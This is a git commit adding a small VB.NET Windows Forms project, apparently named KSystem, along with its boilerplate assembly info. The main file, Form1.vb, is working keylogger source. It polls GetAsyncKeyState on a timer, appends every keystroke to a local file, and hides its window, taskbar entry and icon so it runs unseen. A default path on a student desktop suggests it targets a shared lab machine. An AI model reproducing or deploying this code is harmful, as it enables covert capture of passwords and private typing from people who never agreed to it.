dde5b42995d79cce30cf20332f2874e97093ed41
Max <soomaxim13@gmail.com>
2026-04-30 10:48:03 -0300

    Add files via upload

---
+++ KSys/KSys/Form1.vb
@@ -0,0 +1,45 @@
+﻿Imports System.IO
+Imports System.Runtime.InteropServices
+
+Public Class Form1
+    Dim caminho As String = "C:\Users\Alunos\Desktop\txt.sk"
+    <DllImport("user32.dll")>
+    Shared Function GetAsyncKeyState(ByVal vKey As Integer) As Short
+    End Function
+    Private Sub Form1_KeyDown(sender As Object, e As KeyEventArgs) Handles MyBase.KeyDown
+
+
+    End Sub
+
+    Private Sub salvar(i As String)
+        If File.Exists(caminho) Then
+            File.WriteAllText(caminho, $"{File.ReadAllText(caminho)}{i}")
+        Else
+            File.WriteAllText(caminho, i)
+        End If
+    End Sub
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        For i As Integer = 8 To 255
+            Dim keyState As Short = GetAsyncKeyState(i)
+            If (keyState And &H1) = &H1 Then
+                Dim tecla As String = Chr(i)
+                salvar(tecla)
+            End If
+        Next
+        Me.WindowState = FormWindowState.Minimized
+        Me.Hide()
+        Me.ShowInTaskbar = False
+        Me.ShowIcon = False
+        Me.Focus()
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        If (My.Settings.Local = "" Or Directory.Exists(My.Settings.Local)) Then
+            If (FolderBrowserDialog1.ShowDialog = DialogResult.OK) Then My.Settings.Local = FolderBrowserDialog1.SelectedPath
+            My.Settings.Save()
+        End If
+        caminho = My.Settings.Local & "\setkys.sksys"
+        Timer1.Start()
+    End Sub
+End Class
---
+++ KSys/KSys/My Project/AssemblyInfo.vb
@@ -0,0 +1,32 @@
+﻿Imports System
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+
+' As informações gerais sobre um assembly são controladas por
+' conjunto de atributos. Altere estes valores de atributo para modificar as informações
+' associada a um assembly.
+
+' Revise os valores dos atributos do assembly
+
+<Assembly: AssemblyTitle("KSystem")>
+<Assembly: AssemblyDescription("")>
+<Assembly: AssemblyCompany("")>
+<Assembly: AssemblyProduct("KSystem")>
+<Assembly: AssemblyCopyright("Copyright ©  2026")>
+<Assembly: AssemblyTrademark("")>
+
+<Assembly: ComVisible(False)>
+
+'O GUID a seguir será destinado à ID de typelib se este projeto for exposto para COM
+<Assembly: Guid("57d7edea-b033-4e88-8df8-a32ded1a0ba5")>
+
+' As informações da versão de um assembly consistem nos quatro valores a seguir:
+'
+'      Versão Principal
+'      Versão Secundária 
+'      Número da Versão
+'      Revisão
+'
+
+<Assembly: AssemblyVersion("1.0.0.0")>
+<Assembly: AssemblyFileVersion("1.0.0.0")>
